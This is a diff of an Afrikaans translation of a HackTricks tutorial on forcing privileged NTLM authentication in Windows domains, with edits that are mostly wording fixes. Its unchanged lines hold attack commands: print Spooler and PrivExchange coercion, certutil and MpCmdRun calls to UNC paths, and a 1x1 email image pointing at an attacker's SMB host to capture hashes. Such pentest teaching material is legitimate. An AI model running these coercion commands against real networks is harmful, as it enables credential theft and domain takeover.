@@ -1,15 +1,15 @@
 # Force NTLM Privileged Authentication
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -21,18 +21,18 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 ## Spooler Service Abuse
 
-As die _**Print Spooler**_ diens **geaktiveer** is, kan jy 'n paar reeds bekende AD-akkrediteerings gebruik om 'n **versoek** aan die Domeinbeheerder se drukbediener te doen vir 'n **opdatering** oor nuwe drukwerk en net vir dit te sê om die **kennisgewing na 'n stelsel te stuur**.\
-Let daarop dat wanneer die drukker die kennisgewing na 'n arbitrêre stelsel stuur, dit moet **autentiseer teen** daardie **stelsel**. Daarom kan 'n aanvaller die _**Print Spooler**_ diens laat autentiseer teen 'n arbitrêre stelsel, en die diens sal die **rekenaarrekening** in hierdie autentisering gebruik.
+As die _**Print Spooler**_ diens **geaktiveer** is, kan jy 'n paar reeds bekende AD-akkrediteeringe gebruik om 'n **versoek** aan die Domeinbeheerder se drukbediener te doen vir 'n **opdatering** oor nuwe drukwerk en net vir dit te sê om die **kennisgewing na 'n stelsel te stuur**.\
+Let daarop dat wanneer die drukker die kennisgewing na 'n arbitrêre stelsel stuur, dit moet **autentiseer teen** daardie **stelsel**. Daarom kan 'n aanvaller die _**Print Spooler**_ diens laat autentiseer teen 'n arbitrêre stelsel, en die diens sal die **rekenaarrekening** in hierdie autentisering **gebruik**.
 
 ### Finding Windows Servers on the domain
 
-Met PowerShell, kry 'n lys van Windows bokse. Bedieners is gewoonlik prioriteit, so kom ons fokus daar:
+Gebruik PowerShell om 'n lys van Windows-bokse te kry. Bedieners is gewoonlik prioriteit, so kom ons fokus daar:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Vind Spooler dienste wat luister
+### Finding Spooler services listening
 
-Gebruik 'n effens aangepaste @mysmartlogin se (Vincent Le Toux se) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), kyk of die Spooler Diens luister:
+Gebruik 'n effens aangepaste @mysmartlogin se (Vincent Le Toux se) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), kyk of die Spooler-diens luister:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -41,7 +41,7 @@ U kan ook rpcdump.py op Linux gebruik en soek na die MS-RPRN Protokol
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Vra die diens om teen 'n arbitrêre gasheer te autentiseer
+### Vra die diens om teen 'n arbitrêre gasheer te verifieer
 
 Jy kan[ **SpoolSample hier van**](https://github.com/NotMedic/NetNTLMtoSilverTicket)** saamstel.**
 ```bash
@@ -64,11 +64,11 @@ As 'n aanvaller reeds 'n rekenaar met [Onbeperkte Delegasie](unconstrained-deleg
 
 Die `PrivExchange` aanval is 'n gevolg van 'n fout wat in die **Exchange Server `PushSubscription` kenmerk** gevind is. Hierdie kenmerk laat die Exchange-server toe om deur enige domein gebruiker met 'n posbus gedwing te word om aan enige kliënt-gelewerde gasheer oor HTTP te outentiseer.
 
-Standaard loop die **Exchange diens as SYSTEM** en word dit oorgenoeg bevoegdhede gegee (specifiek, dit het **WriteDacl bevoegdhede op die domein voor-2019 Kumulatiewe Opdatering**). Hierdie fout kan benut word om die **oorplasing van inligting na LDAP moontlik te maak en gevolglik die domein NTDS databasis te onttrek**. In gevalle waar oorplasing na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om oor te plaas en aan ander gasheer binne die domein te outentiseer. Die suksesvolle benutting van hierdie aanval bied onmiddellike toegang tot die Domein Admin met enige geoutentiseerde domein gebruiker rekening.
+Standaard loop die **Exchange diens as SYSTEM** en word dit oorgenoeg bevoegdhede gegee (specifiek, dit het **WriteDacl bevoegdhede op die domein voor-2019 Kumulatiewe Opdatering**). Hierdie fout kan misbruik word om die **oorplasing van inligting na LDAP moontlik te maak en gevolglik die domein NTDS databasis te onttrek**. In gevalle waar oorplasing na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om oor te plaas en aan ander gasheer binne die domein te outentiseer. Die suksesvolle misbruik van hierdie aanval bied onmiddellike toegang tot die Domein Admin met enige geoutentiseerde domein gebruiker rekening.
 
 ## Binne Windows
 
-As jy reeds binne die Windows masjien is, kan jy Windows dwing om met 'n bediener te verbind met behulp van bevoorregte rekeninge met:
+As jy reeds binne die Windows masjien is, kan jy Windows dwing om met 'n bediener te verbind deur gebruik te maak van bevoorregte rekeninge met:
 
 ### Defender MpCmdRun
 ```bash
@@ -93,7 +93,7 @@ Of gebruik hierdie ander tegniek: [https://github.com/p0dalirius/MSSQL-Analysis-
 
 ### Certutil
 
-Dit is moontlik om certutil.exe lolbin (Microsoft-onderteken binêre) te gebruik om NTLM-outeentisering te dwing:
+Dit is moontlik om certutil.exe lolbin (Microsoft-onderteken binêre) te gebruik om NTLM-outeentifikasie te dwing:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
@@ -101,7 +101,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Deur e-pos
 
-As jy die **e-posadres** van die gebruiker wat binne 'n masjien aanmeld wat jy wil kompromitteer, ken, kan jy hom eenvoudig 'n **e-pos met 'n 1x1 beeld** stuur soos
+As jy die **e-posadres** van die gebruiker wat binne 'n masjien aanmeld wat jy wil kompromitteer, ken, kan jy hom eenvoudig 'n **e-pos met 'n 1x1 beeld** soos stuur
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -116,18 +116,18 @@ As jy 'n MitM-aanval op 'n rekenaar kan uitvoer en HTML in 'n bladsy kan inspuit
 ## Krake NTLMv1
 
 As jy [NTLMv1 uitdagings kan vang, lees hier hoe om hulle te krake](../ntlm/#ntlmv1-attack).\
-_Onthou dat jy die Responder-uitdaging moet stel op "1122334455667788"_
+&#xNAN;_&#x52;emember dat jy om NTLMv1 te krake, die Responder-uitdaging op "1122334455667788" moet stel._
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
